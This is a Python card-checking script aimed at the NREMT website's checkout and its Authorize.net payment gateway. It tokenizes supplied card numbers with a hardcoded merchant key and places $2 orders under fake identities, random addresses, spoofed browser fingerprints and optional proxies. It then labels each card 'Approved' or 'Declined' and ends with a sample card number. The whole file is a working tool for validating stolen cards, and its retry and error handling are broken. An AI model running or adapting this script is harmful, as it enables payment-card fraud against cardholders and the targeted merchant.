import re, random, time, json, uuid, random_address
from random import choice, randint
from faker import Faker
from curl_cffi import requests as req
# Hecho con Curl_cffi y usamos clases
class Authorize:

    @staticmethod
    def fakemail():
        domains = ["gmail.com", "outlook.com", "hotmail.com", "yahoo.com"]
        chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        username = "".join(choice(chars) for _ in range(randint(6, 12)))
        return f"{username}@{choice(domains)}"

    @staticmethod
    def fakedata():
        fake = Faker('en_US')
        return {"first_name": fake.first_name(), "last_name": fake.last_name(), "address": fake.street_address(), "city": fake.city(), "state": fake.state_abbr(), "postal": fake.postcode()}

    @staticmethod
    def capture(string: str, init: str, offset: str) -> str:
        try: return string.split(init)[1].split(offset)[0]
        except: return ''

    @staticmethod
    def verifyCard(cc: str) -> dict:
        number, month, year, cvv = re.split(r'\s*[|/]\s*|\s+', cc)
        year = f"20{year}" if len(year) == 2 else year
        types = {'4': 'visa', '5': 'mastercard', '3': 'amex', '6': 'discover'}
        return {'number': number, 'month': month.zfill(2), 'year': year, 'cvv': cvv,'type': types[number[0]]}

    @staticmethod
    def getResponse(response: str) -> bool:
        responses = ['There was an issue validating the card security code.', 'Insufficient Funds']
        for i in responses:
            if i in response: return True
        return False

    @staticmethod
    def gen_address() -> dict:
        try:
            genaddr = random_address.real_random_address()
            return {'address': genaddr['address1'], 'city': genaddr.get('city', 'Miami'), 'state': genaddr['state'], 'postal': genaddr['postalCode']}
        except:
            return {'address': '123 Main St', 'city': 'Miami', 'state': 'FL', 'postal': '33130'}


def main(cc: str, pxy=None, retries: int = 0) -> dict:
    start = time.time()
    cc    = cc.strip()
    card  = Authorize.verifyCard(cc)
    data  = Authorize.fakedata()
    addr  = Authorize.gen_address()
    mail  = Authorize.fakemail()
    phone = f'727{randint(1000,9999)}{randint(1000,9999)}'
    sess  = req.Session(impersonate=random.choice(["chrome120", "chrome124", "chrome123"]))
    if pxy:
        sess.proxies = {'http': f'http://{pxy}', 'https': f'http://{pxy}'}

    try:
        s1 = sess.post('https://www.nremt.org/ShoppingCart/AddToCart', headers={'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'es-ES,es;q=0.9', 'content-type': 'application/json; charset=UTF-8', 'origin': 'https://www.nremt.org', 'referer': 'https://www.nremt.org/Products/Vouchers/Paper-Application-Processing-Fee-Voucher', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', 'x-requested-with': 'XMLHttpRequest'},json={'ProductSKUID': 96, 'Quantity': 1}, timeout=30)
        time.sleep(1)
        s2 = sess.get('https://www.nremt.org/shopping-cart', headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'es-ES,es;q=0.9', 'referer': 'https://www.nremt.org/Products/Vouchers/Paper-Application-Processing-Fee-Voucher', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', 'upgrade-insecure-requests': '1'}, timeout=30)
        time.sleep(1)
        s3 = sess.get('https://www.nremt.org/shopping-cart/checkout', headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'es-ES,es;q=0.9', 'referer': 'https://www.nremt.org/shopping-cart', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', 'upgrade-insecure-requests': '1'}, timeout=30)
        time.sleep(1)
        s4 = sess.post('https://api2.authorize.net/xml/v1/request.api', headers={'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/json; charset=UTF-8', 'Origin': 'https://js.authorize.net', 'Referer': 'https://js.authorize.net/', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'}, json={'securePaymentContainerRequest': {'merchantAuthentication': {'name': '5Ww66SGu5', 'clientKey': '4jErzDpW56xvKpGjH7V53J3xhPCE9uw8GGs37ZmpxA65yqKWVYyq92QVC3m9FpZr'}, 'clientId': 'accept-ui-v3', 'data': {'type': 'TOKEN', 'id': 'e8323048-aece-187c-d42a-6120507f6de2', 'token': {'cardNumber': card['number'], 'expirationDate': f"{card['month']}{card['year']}", 'cardCode': card['cvv']}}}}, timeout=30)
        token = Authorize.capture(s4.text, 'dataValue":"', '"')
        if not token: return { 'card': cc, 'status': 'Error ⚠️', 'message': 'No token found!'}
        time.sleep(1)
        s5 = sess.get('https://www.nremt.org/validate-address', params={'AuthNetAddressId': 'null', 'FirstName': data['first_name'], 'LastName': data['last_name'], 'PhoneNumber': '', 'StreetAddress': addr['address'], 'City': addr['city'], 'State': addr['state'], 'ZipCode': addr['postal'], 'Country': 'USA', 'IsValidated': 'false'}, headers={'accept': '*/*', 'accept-language': 'es-ES,es;q=0.9', 'referer': 'https://www.nremt.org/shopping-cart/checkout', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'}, timeout=30)
        s6 = sess.post('https://www.nremt.org/Checkout/SaveOrder', headers={'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'es-ES,es;q=0.9', 'content-type': 'application/json; charset=UTF-8', 'origin': 'https://www.nremt.org', 'referer': 'https://www.nremt.org/shopping-cart/checkout', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', 'x-requested-with': 'XMLHttpRequest'}, json={'UserId': 0, 'ShippingAddress': {'AuthNetAddressId': None, 'FirstName': '', 'LastName': '', 'PhoneNumber': '', 'StreetAddress': '', 'City': '', 'State': '', 'ZipCode': '', 'Country': '', 'IsValidated': False}, 'BillingAddress': {'AuthNetAddressId': None, 'FirstName': data['first_name'], 'LastName': data['last_name'], 'PhoneNumber': '', 'StreetAddress': addr['address'], 'City': addr['city'], 'State': addr['state'], 'ZipCode': addr['postal'], 'Country': 'USA', 'IsValidated': True}, 'PaymentInformation': {}, 'AuthOpaqueData': {'dataDescriptor': 'COMMON.ACCEPT.INAPP.PAYMENT', 'dataValue': token}, 'BillingAddressSameAsShipping': False, 'ShippingOptionId': 0, 'PaymentType': '1', 'IsGuestCheckout': True, 'UserHasCIMProfile': False, 'AddNewCIMShippingAddress': False, 'AddNewCIMPaymentMethod': False, 'CustomerProfile': {'FirstName': data['first_name'], 'LastName': data['last_name'], 'Email': mail, 'PhoneNumber': phone}}, timeout=30)
        elapsed = round(time.time() - start, 2)
        try:
            r6_json = s6.json()
            code    = r6_json.get('Description', '')
            success = r6_json.get('Success', False)
            data_r  = r6_json.get('data', None)

            if success or data_r or any(kw in str(r6_json) for kw in ['"OrderGUID"', 'OrderGUID']):
                return {'status': True, 'success': True, 'card': cc, 'status': 'Approved! ✅', 'message': 'Charged $2.00!'}
            else:
                if Authorize.getResponse(code):
                    return {'card': cc, 'status': 'Approved! ✅', 'message': code.strip()}
                else:
                    return {'card': cc, 'status': 'Declined! ❌', 'message': code or 'This transaction has been declined.'}
        except Exception:
            return { 'card': cc, 'status': 'Error ⚠️', 'message': f'Parse error: {s6.text[:200]}'}

    except Exception as error:
        if retries < 3: return gate(cc=cc, pxy=pxy, retries=retries + 1)
        else: return { 'card': cc, 'status': 'Error ⚠️', 'message': f'Exception -> {str}'}


#proxy = 'user:pass@host:port' o 'ip:port'
r = main("4147098567014048|01|2027|569", 
#pxy=proxy
)
print(r)
